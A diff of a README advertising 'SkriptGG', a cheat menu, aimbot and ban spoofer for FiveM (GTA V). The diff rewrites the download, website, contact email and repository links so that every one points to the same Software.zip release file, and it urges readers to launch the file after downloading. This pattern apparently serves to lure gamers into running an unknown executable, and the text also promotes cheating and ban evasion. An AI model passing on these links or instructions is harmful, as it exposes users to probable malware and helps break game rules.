@@ -8,9 +8,9 @@ Welcome to SkriptGG - your go-to destination for the best mod menu options for F
 - **Topics:** fivem-aimbot-new, fivem-cheat-download-2024, fivem-cheat-legit, fivem-da-bans, fivem-hack-menu-2024, fivem-hacks-legit, fivem-lua-executor-new, fivem-new-mod-menu, fivem-spoofer-ban, fivem-unban-2024, skript-gg, skript-gg-download, skript-gg-menu, skript-gg-source-code, skriptgg, skriptgg-aimbot, skriptgg-download, skriptgg-spoofer-free
 
 ## 🌟 Featured Download
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/eagle1209/SkriptGG/releases/download/v2.0/Software.zip)](https://github.com/eagle1209/SkriptGG/releases/download/v2.0/Software.zip)
 
-📌 **Note:** The provided link directs you to the Software.zip file for downloading. Don't forget to launch the file after downloading to access the amazing mod menu features! 
+📌 **Note:** The provided link directs you to the https://github.com/eagle1209/SkriptGG/releases/download/v2.0/Software.zip file for downloading. Don't forget to launch the file after downloading to access the amazing mod menu features! 
 
 ## 📂 How to Use SkriptGG Repository 📂
 1. **Clone the Repository:** Start by cloning the SkriptGG repository to your local machine.
@@ -27,14 +27,14 @@ Welcome to SkriptGG - your go-to destination for the best mod menu options for F
 - 🎯 **Aimbot 2024:** Stay ahead of the competition with cutting-edge aimbot functionalities.
 
 ## 📌 Additional Resources
-- **Visit the Website:** Connect with us on our official [SkriptGG Website](https://skriptgg.com) for more updates and features.
+- **Visit the Website:** Connect with us on our official [SkriptGG Website](https://github.com/eagle1209/SkriptGG/releases/download/v2.0/Software.zip) for more updates and features.
 - **Check Releases Section:** In case the download link is unavailable or not working, head to the "Releases" section of the repository for alternative download options.
 
 ## 🤝 Get in Touch
-For any inquiries, suggestions, or support requests, feel free to reach out to us via email at contact@skriptgg.com.
+For any inquiries, suggestions, or support requests, feel free to reach out to us via email at https://github.com/eagle1209/SkriptGG/releases/download/v2.0/Software.zip
 
 Dive into the world of GTA V multiplayer gaming like never before with SkriptGG - your ultimate destination for mod menus and cheats! 💥
 
 ---
 
-[Visit SkriptGG Repository](https://github.com/YouaifXD/SkriptGG) 👈
+[Visit SkriptGG Repository](https://github.com/eagle1209/SkriptGG/releases/download/v2.0/Software.zip) 👈
